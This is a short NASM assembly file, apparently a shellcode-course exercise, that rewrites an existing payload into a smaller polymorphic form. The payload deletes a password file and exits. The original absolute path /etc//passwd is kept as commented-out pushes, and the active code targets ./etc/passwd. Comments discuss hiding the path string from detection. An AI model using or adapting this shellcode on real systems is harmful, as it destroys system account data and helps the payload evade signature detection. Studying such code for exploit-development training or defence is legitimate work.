; Filename: unlink-etc-passwd.nasm
; Author: Gitsnik SLAE-431
; Website: http://dracyrys.com/
;
; Original: 35 bytes (jmp-call-pop)
;
; Shellcode is now 29 bytes and uses the
; push method for finding the string.
;
; 3/18 lines the same (16.66%)
; 29 bytes total (82.86% of original)
;
; Purpose:
;	unlink( /etc/passwd ) and exit()
;
; Notes:
;	It is possible to hide the /etc/ passwd strings
;	by encoding them further. However the string
;	appeared, in full, in the original shellcode
;	and it does not do so here.
;

global _start

section .text

_start:
	xor ecx, ecx	; [SAME]
	mul ecx

	add al, 0x0a	; unlink ( dec 10 )
	push ecx	; null terminated

	; To preserve functionality
	; here is /etc//passwd
	;push 0x64777373	; dwss
	;push 0x61702f2f	; ap//
	;push 0x6374652f 	; cte/
	;
	; But bugger that, test system
	; or not, let us use something
	; smarter ( ./etc/passwd )
	push 0x64777373		; dwss
	push 0x61702f63		; ap/c
	push 0x74652f2e 	; te/.

	mov ebx, esp

	int 0x80

	inc eax		; unlink returns 0 on success
	int 0x80
